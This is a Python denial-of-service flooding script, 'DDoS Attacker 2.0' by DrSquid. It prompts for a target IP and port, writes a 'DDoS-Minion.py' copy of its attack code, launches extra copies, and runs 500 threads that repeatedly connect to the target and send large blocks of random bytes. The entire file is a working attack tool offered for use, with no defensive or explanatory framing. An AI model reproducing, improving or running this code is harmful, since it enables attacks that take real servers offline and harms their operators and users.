import glob, os, threading, random, sys, socket
print("  _____  _____        _____           _   _             _               ___    ___  ")
print(" |  __ \|  __ \      / ____|     /\  | | | |           | |             |__ \  / _ \ ")
print(" | |  | | |  | | ___| (___      /  \ | |_| |_ __ _  ___| | _____ _ __     ) || | | |")
print(" | |  | | |  | |/ _  \___ \    / /\ \| __| __/ _` |/ __| |/ / _ \ '__|   / / | | | |")
print(" | |__| | |__| | (_) |___) |  / ____ \ |_| || (_| | (__|   <  __/ |     / /_ | |_| |")
print(" |_____/|_____/ \___/_____/  /_/    \_\__|\__\__,_|\___|_|\_\___|_|    |____(_)___/ ")
print(" Script By DrSquid")
print("")
print("[+] This Script Creates A Minion File For Making Even More Threads.")
while True:
    try:
        port = int(input("[+] Enter the port to attack: "))
        ip = input("[+] Enter an IP to attack: ")
        ip = socket.gethostbyname(ip)
        amountofthreads = int(input("[+] How many other scripts do you want to create(Ideal Amount is 1-2)?: "))
        break
    except:
        print("[+] Invalid Input.")
currentdir = open(sys.argv[0], 'r')
request_sent = 0
lines_to_type = ['import os, random, socket, threading\n','packet = random._urandom(42069)\n', 'request_sent = 0\n', f'port = {port}\n', f'ip = "{ip}"\n', 'thread_num_mutex = threading.Lock()\n', 'def printstatus():\n', '    global request_sent\n', '    request_sent += 1\n', '    thread_num_mutex.acquire(True)\n', '    print("[+] DDoS Attack {} Port - IP: {} - {} Requests Sent".format(port, ip, request_sent).strip())\n', '    thread_num_mutex.release()\n', 'def ddos():\n', '    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n', '    while True:\n', '        try:\n', '            printstatus()\n', '            sock.connect((ip, port))\n', '            sock.send(packet)\n', '        except socket.error:\n', '            print("[+] Server may be down.")\n', 'threads = []\n', 'for i in range(500):\n', '    x = threading.Thread(target=ddos)\n', '    x.start()\n', '    threads.append(x)\n', 'for currentthread in threads:\n', '    currentthread.join()\n']
other_scripts = glob.glob('*.py')
other_scripts_count = len(other_scripts)
scripts_created = 0
packet = random._urandom(42069)
thread_num_mutex = threading.Lock()
def file_create():
    file_name = "DDoS-Minion"
    file = open(file_name + ".py", 'w')
    file.writelines(lines_to_type)
    file.close()
    for i in range(amountofthreads):
        try:
            os.startfile(file.name)
        except:
            pass
def printstatus():
    global request_sent
    request_sent += 1
    thread_num_mutex.acquire(True)
    print("[+] DDoS Attack {} Port - IP: {} - {} Requests Sent".format(port, ip, request_sent))
    thread_num_mutex.release()
def ddos():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            printstatus()
            sock.connect((ip, port))
            sock.send(packet)
        except socket.error:
            print("[+] Server may be down.")
file_create()
threads = []
for i in range(500):
    x = threading.Thread(target=ddos)
    x.start()
    threads.append(x)
for currentthread in threads:
    currentthread.join()